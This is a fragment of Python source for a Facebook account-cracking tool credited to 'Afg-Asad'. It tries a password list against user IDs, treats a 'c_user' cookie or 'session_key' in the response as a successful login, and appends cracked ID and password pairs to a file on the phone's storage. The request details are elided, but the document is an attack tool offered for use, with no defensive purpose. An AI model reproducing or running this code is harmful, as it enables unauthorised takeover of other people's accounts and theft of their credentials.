...
----------------------------------------------
 Github    : Afg-Asad
 Facebook  : Asad Kheyam
 Enjoy Free : My Afg Brothers
 Type type : NO PAID THIS FREE
 Version   : 1.1.0
----------------------------------------------
 Asad Pro version 1.0.0
 Dad Of All: Name Tho Suna Hoga Asad Dada
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AFG-ASAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Veero:
                                ...
                                print('\r\r\033[1;32m [ASAD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ASAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Veero:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ASAD-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ASAD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ASAD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ASAD-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ASAD-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ASAD-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ASAD-OK] '+uid+' | '+pas+'\033[1;97m')
